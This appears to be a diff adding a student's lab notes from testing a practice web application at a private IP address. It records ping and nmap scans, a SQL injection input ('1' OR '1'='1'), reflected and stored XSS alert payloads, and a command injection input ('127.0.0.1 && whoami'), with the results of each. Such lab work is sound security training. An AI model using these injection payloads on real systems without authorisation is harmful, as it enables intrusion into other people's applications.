@@ -1,0 +1,54 @@
+Target IP: 192.168.74.128
+
+Ping:
+ping 192.168.74.128
+
+Nmap Scan:
+nmap -sV 192.168.74.128
+
+SQL Injection Test:
+Input: 1
+Result: Single user returned.
+
+Input: 1' OR '1'='1
+Result: Multiple user records displayed.
+==============================
+Reflected XSS
+==============================
+
+Payload:
+<script>alert('XSS')</script>
+
+Result:
+Alert popup displayed successfully.
+
+Impact:
+JavaScript code executed in the browser.
+==============================
+Stored XSS
+==============================
+
+Payload:
+<script>alert('Stored XSS')</script>
+
+Result:
+Alert popup displayed successfully.
+
+Impact:
+The malicious script was stored in the application and executed whenever the page was opened.
+
+==============================
+Command Injection
+==============================
+
+Input:
+127.0.0.1
+
+Result:
+Ping executed successfully.
+
+Input:
+127.0.0.1 && whoami
+
+Result:
+The additional command was executed, demonstrating command injection in the lab.
